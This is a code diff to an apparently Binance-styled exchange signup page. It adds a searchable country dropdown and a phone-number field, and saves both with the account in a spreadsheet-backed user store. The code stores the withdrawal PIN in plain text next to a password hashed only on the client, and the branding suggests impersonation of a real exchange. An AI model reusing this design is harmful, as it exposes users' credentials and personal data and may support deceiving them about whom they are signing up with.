@@ -113,6 +113,86 @@
         .loading-progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #fcd535, #0ecb81, #f6465d, #fcd535); background-size: 200% 100%; border-radius: 2px; animation: fillProgress 0.5s linear forwards, shimmer 1.5s ease-in-out infinite; }
         @keyframes fillProgress { to { width: 100%; } }
         @keyframes shimmer { 0% { background-position: 0% 0%; } 100% { background-position: 200% 0%; } }
+        
+        /* Searchable Country Dropdown Styles */
+        .country-dropdown-container {
+            position: relative;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .country-dropdown-btn {
+            width: 100%;
+            padding: 14px 14px 14px 44px;
+            background: #2b2f36;
+            border: 1px solid #3b424d;
+            border-radius: 12px;
+            font-size: 14px;
+            color: white;
+            text-align: left;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .country-dropdown-btn:hover {
+            border-color: #fcd535;
+        }
+        .country-dropdown-menu {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: #2b2f36;
+            border: 1px solid #3b424d;
+            border-radius: 12px;
+            margin-top: 4px;
+            max-height: 250px;
+            overflow-y: auto;
+            z-index: 100;
+            display: none;
+        }
+        .country-dropdown-menu.show {
+            display: block;
+        }
+        .country-search {
+            padding: 10px;
+            border-bottom: 1px solid #3b424d;
+            position: sticky;
+            top: 0;
+            background: #2b2f36;
+        }
+        .country-search input {
+            width: 100%;
+            padding: 10px;
+            background: #1e2329;
+            border: 1px solid #3b424d;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+        .country-search input:focus {
+            border-color: #fcd535;
+        }
+        .country-option {
+            padding: 10px 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: white;
+            font-size: 14px;
+        }
+        .country-option:hover {
+            background: #3b424d;
+        }
+        .country-option.selected {
+            background: #fcd53520;
+            border-left: 3px solid #fcd535;
+        }
+        .country-flag {
+            font-size: 18px;
+        }
     </style>
 </head>
 <body>
@@ -235,6 +315,33 @@
                     <p class="text-xs text-gray-500 mt-1">Must be at least 6 characters</p>
                 </div>
 
+                <!-- Country Dropdown with Search -->
+                <div class="input-group">
+                    <label>Country</label>
+                    <div class="country-dropdown-container">
+                        <div class="country-dropdown-btn" id="countryDropdownBtn">
+                            <span><span class="country-flag">🌍</span> Select Country</span>
+                            <i class="fa-solid fa-chevron-down"></i>
+                        </div>
+                        <div class="country-dropdown-menu" id="countryDropdownMenu">
+                            <div class="country-search">
+                                <input type="text" id="countrySearchInput" placeholder="🔍 Search country..." autocomplete="off">
+                            </div>
+                            <div id="countryList"></div>
+                        </div>
+                    </div>
+                    <input type="hidden" id="selectedCountry" value="">
+                </div>
+
+                <!-- Phone Number Field -->
+                <div class="input-group">
+                    <label>Phone Number</label>
+                    <div class="input-wrapper">
+                        <i class="fa-solid fa-phone prefix"></i>
+                        <input type="tel" id="signup-phone" placeholder="Enter your phone number (e.g., +1234567890)">
+                    </div>
+                </div>
+
                 <div class="pin-box">
                     <div class="pin-title">
                         <i class="fa-solid fa-shield-halved"></i> Withdrawal PIN (6 digits)
@@ -309,6 +416,122 @@
     let pendingEmail = null;
     let pendingCode = null;
     let codeExpiry = null;
+
+    // 100 Countries with Flags
+    const countries = [
+        { flag: "🇺🇸", name: "United States" }, { flag: "🇬🇧", name: "United Kingdom" },
+        { flag: "🇨🇦", name: "Canada" }, { flag: "🇦🇺", name: "Australia" },
+        { flag: "🇳🇿", name: "New Zealand" }, { flag: "🇩🇪", name: "Germany" },
+        { flag: "🇫🇷", name: "France" }, { flag: "🇯🇵", name: "Japan" },
+        { flag: "🇨🇳", name: "China" }, { flag: "🇮🇳", name: "India" },
+        { flag: "🇰🇷", name: "South Korea" }, { flag: "🇸🇬", name: "Singapore" },
+        { flag: "🇲🇾", name: "Malaysia" }, { flag: "🇮🇩", name: "Indonesia" },
+        { flag: "🇵🇭", name: "Philippines" }, { flag: "🇻🇳", name: "Vietnam" },
+        { flag: "🇹🇭", name: "Thailand" }, { flag: "🇳🇬", name: "Nigeria" },
+        { flag: "🇰🇪", name: "Kenya" }, { flag: "🇬🇭", name: "Ghana" },
+        { flag: "🇿🇦", name: "South Africa" }, { flag: "🇪🇬", name: "Egypt" },
+        { flag: "🇲🇦", name: "Morocco" }, { flag: "🇧🇷", name: "Brazil" },
+        { flag: "🇲🇽", name: "Mexico" }, { flag: "🇦🇷", name: "Argentina" },
+        { flag: "🇨🇱", name: "Chile" }, { flag: "🇨🇴", name: "Colombia" },
+        { flag: "🇪🇸", name: "Spain" }, { flag: "🇮🇹", name: "Italy" },
+        { flag: "🇵🇹", name: "Portugal" }, { flag: "🇬🇷", name: "Greece" },
+        { flag: "🇳🇱", name: "Netherlands" }, { flag: "🇧🇪", name: "Belgium" },
+        { flag: "🇨🇭", name: "Switzerland" }, { flag: "🇸🇪", name: "Sweden" },
+        { flag: "🇳🇴", name: "Norway" }, { flag: "🇩🇰", name: "Denmark" },
+        { flag: "🇫🇮", name: "Finland" }, { flag: "🇵🇱", name: "Poland" },
+        { flag: "🇨🇿", name: "Czech Republic" }, { flag: "🇦🇹", name: "Austria" },
+        { flag: "🇮🇪", name: "Ireland" }, { flag: "🇮🇱", name: "Israel" },
+        { flag: "🇸🇦", name: "Saudi Arabia" }, { flag: "🇦🇪", name: "UAE" },
+        { flag: "🇶🇦", name: "Qatar" }, { flag: "🇰🇼", name: "Kuwait" },
+        { flag: "🇹🇷", name: "Turkey" }, { flag: "🇷🇺", name: "Russia" },
+        { flag: "🇱🇰", name: "Sri Lanka" }, { flag: "🇲🇲", name: "Myanmar" },
+        { flag: "🇰🇭", name: "Cambodia" }, { flag: "🇺🇿", name: "Uzbekistan" },
+        { flag: "🇰🇿", name: "Kazakhstan" }, { flag: "🇬🇪", name: "Georgia" },
+        { flag: "🇦🇿", name: "Azerbaijan" }, { flag: "🇦🇲", name: "Armenia" },
+        { flag: "🇲🇩", name: "Moldova" }, { flag: "🇦🇱", name: "Albania" },
+        { flag: "🇲🇰", name: "North Macedonia" }, { flag: "🇧🇦", name: "Bosnia" },
+        { flag: "🇭🇷", name: "Croatia" }, { flag: "🇷🇸", name: "Serbia" },
+        { flag: "🇲🇪", name: "Montenegro" }, { flag: "🇽🇰", name: "Kosovo" },
+        { flag: "🇧🇬", name: "Bulgaria" }, { flag: "🇷🇴", name: "Romania" },
+        { flag: "🇭🇺", name: "Hungary" }, { flag: "🇸🇰", name: "Slovakia" },
+        { flag: "🇸🇮", name: "Slovenia" }, { flag: "🇱🇻", name: "Latvia" },
+        { flag: "🇱🇹", name: "Lithuania" }, { flag: "🇪🇪", name: "Estonia" },
+        { flag: "🇮🇸", name: "Iceland" }, { flag: "🇱🇺", name: "Luxembourg" },
+        { flag: "🇲🇹", name: "Malta" }, { flag: "🇨🇾", name: "Cyprus" },
+        { flag: "🇯🇲", name: "Jamaica" }, { flag: "🇹🇹", name: "Trinidad" },
+        { flag: "🇧🇸", name: "Bahamas" }, { flag: "🇧🇧", name: "Barbados" },
+        { flag: "🇫🇯", name: "Fiji" }, { flag: "🇵🇬", name: "Papua New Guinea" },
+        { flag: "🇸🇧", name: "Solomon Islands" }, { flag: "🇼🇸", name: "Samoa" },
+        { flag: "🇻🇺", name: "Vanuatu" }, { flag: "🇹🇴", name: "Tonga" },
+        { flag: "🇰🇮", name: "Kiribati" }, { flag: "🇲🇻", name: "Maldives" },
+        { flag: "🇧🇳", name: "Brunei" }, { flag: "🇲🇳", name: "Mongolia" },
+        { flag: "🇳🇵", name: "Nepal" }, { flag: "🇧🇹", name: "Bhutan" },
+        { flag: "🇵🇰", name: "Pakistan" }, { flag: "🇧🇩", name: "Bangladesh" },
+        { flag: "🇮🇷", name: "Iran" }, { flag: "🇮🇶", name: "Iraq" },
+        { flag: "🇸🇾", name: "Syria" }, { flag: "🇾🇪", name: "Yemen" }
+    ];
+
+    // Country Dropdown Functions
+    function renderCountryList(searchTerm = '') {
+        const container = document.getElementById('countryList');
+        if (!container) return;
+        
+        const filtered = searchTerm === '' ? countries : countries.filter(c => 
+            c.name.toLowerCase().includes(searchTerm.toLowerCase())
+        );
+        
+        container.innerHTML = filtered.map(c => `
+            <div class="country-option" data-country="${c.name}" data-flag="${c.flag}">
+                <span class="country-flag">${c.flag}</span>
+                <span>${c.name}</span>
+            </div>
+        `).join('');
+        
+        document.querySelectorAll('.country-option').forEach(opt => {
+            opt.addEventListener('click', () => {
+                const countryName = opt.getAttribute('data-country');
+                const flag = opt.getAttribute('data-flag');
+                document.getElementById('selectedCountry').value = countryName;
+                document.getElementById('countryDropdownBtn').innerHTML = `<span><span class="country-flag">${flag}</span> ${countryName}</span> <i class="fa-solid fa-chevron-down"></i>`;
+                document.getElementById('countryDropdownMenu').classList.remove('show');
+            });
+        });
+    }
+
+    // Country Dropdown Event Listeners
+    document.addEventListener('DOMContentLoaded', () => {
+        const btn = document.getElementById('countryDropdownBtn');
+        const menu = document.getElementById('countryDropdownMenu');
+        const searchInput = document.getElementById('countrySearchInput');
+        
+        if (btn && menu) {
+            btn.addEventListener('click', (e) => {
+                e.stopPropagation();
+                menu.classList.toggle('show');
+                if (menu.classList.contains('show')) {
+                    renderCountryList();
+                    if (searchInput) {
+                        searchInput.value = '';
+                        searchInput.focus();
+                    }
+                }
+            });
+            
+            document.addEventListener('click', (e) => {
+                if (!btn.contains(e.target) && !menu.contains(e.target)) {
+                    menu.classList.remove('show');
+                }
+            });
+            
+            if (searchInput) {
+                searchInput.addEventListener('input', (e) => {
+                    renderCountryList(e.target.value);
+                });
+            }
+        }
+        
+        renderCountryList();
+    });
 
     async function sha256(message) {
         const msgBuffer = new TextEncoder().encode(message);
@@ -471,7 +694,6 @@
                 currentUserPin = null;
             }
             
-            // Only store email in localStorage, balance and pin will be fetched from database by dashboard
             localStorage.setItem('binance_session_email', currentUserEmail);
             
             showToast('Login successful! Redirecting...', true);
@@ -496,6 +718,8 @@
         const pin = document.getElementById('signup-pin').value;
         const confirmPin = document.getElementById('signup-confirm-pin').value;
         const agree = document.getElementById('signup-agree').checked;
+        const country = document.getElementById('selectedCountry').value;
+        const phone = document.getElementById('signup-phone').value.trim();
         const signupBtn = document.getElementById('signup-btn');
         const pinError = document.getElementById('pin-error');
         pinError.style.display = 'none';
@@ -504,6 +728,7 @@
         if (password.length < 6) { showToast('Password must be at least 6 characters', false); return; }
         if (!pin || pin.length !== 6) { showToast('Please enter a valid 6-digit withdrawal PIN', false); return; }
         if (pin !== confirmPin) { pinError.style.display = 'block'; return; }
+        if (!country) { showToast('Please select your country', false); return; }
         if (!agree) { showToast('Please agree to Terms', false); return; }
         
         setButtonLoading(signupBtn, true, 'Create Account');
@@ -512,13 +737,25 @@
             if (existingUser) { showToast('Email already exists', false); return; }
             
             const hashedPassword = await sha256(password);
-            await addUserToSheet({ Email: email, Password: "", HashedPassword: hashedPassword, Pin: pin, Balance: 0, Notifications: JSON.stringify([]) });
+            await addUserToSheet({ 
+                Email: email, 
+                Password: "", 
+                HashedPassword: hashedPassword, 
+                Pin: pin, 
+                Balance: 0, 
+                Notifications: JSON.stringify([]),
+                Country: country,
+                Phone: phone
+            });
             showToast('Account created successfully! Please login.', true);
             toggleForms();
             document.getElementById('signup-email').value = '';
             document.getElementById('signup-password').value = '';
             document.getElementById('signup-pin').value = '';
             document.getElementById('signup-confirm-pin').value = '';
+            document.getElementById('selectedCountry').value = '';
+            document.getElementById('countryDropdownBtn').innerHTML = '<span><span class="country-flag">🌍</span> Select Country</span> <i class="fa-solid fa-chevron-down"></i>';
+            document.getElementById('signup-phone').value = '';
         } catch (error) { showToast('Signup failed. Please try again.', false); }
         finally { setButtonLoading(signupBtn, false, 'Create Account'); }
     }
